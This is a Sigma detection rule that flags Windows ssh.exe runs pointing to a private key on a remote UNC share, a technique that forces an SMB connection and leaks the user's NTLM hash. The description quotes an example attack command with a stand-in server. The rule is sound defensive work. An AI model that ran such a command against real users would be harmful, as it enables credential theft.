title: Using ssh.exe to steal user's ntlm hash on Windows host
id: 54f5cad9-c98d-43b2-9ce0-379efcf2fbea
status: stable
description: The rule detects the using of ssh.exe with the path to the private key on the remote resource, for example "ssh.exe -i \\remote.server\user\id_rsa user@remote.server". Attackers can execute this command specifying the address of a their server in the user's context, thereby initializing an outgoing SMB connection to it and obtaining the user's ntlm hash.
references:
    - https://trustedsec.com/blog/the-socks-we-have-at-home
    - https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/
    - https://medium.com/@sam.rothlisberger/pdf-shortcut-file-with-ssh-executed-dynamic-reverse-socks-proxy-and-password-file-stealer-e747ffbbe387
tags:
    - attack.credential-access
    - attack.t1187
author: Pavel Kozyaev
date: 2024-12-06
logsource:
    category: process_creation
    product: windows
detection:
  selection_img:
    - Image|endswith: '\ssh.exe'
    - CommandLine|contains:
      - 'ssh.exe'
      - 'ssh'
  selection_product:
    - Product|contains: 'OpenSSH'
  selection_cmd_1:
    - CommandLine|re: '.*\-i \\\\.+\\.*'
  selection_cmd_2:
    - CommandLine|re: '.*[-a-z0-9._]+\@[-a-z0-9.]+.*'
  condition: all of selection_*
falsepositives:
    - Legitimate use of SSH command for administrative purposes
level: high
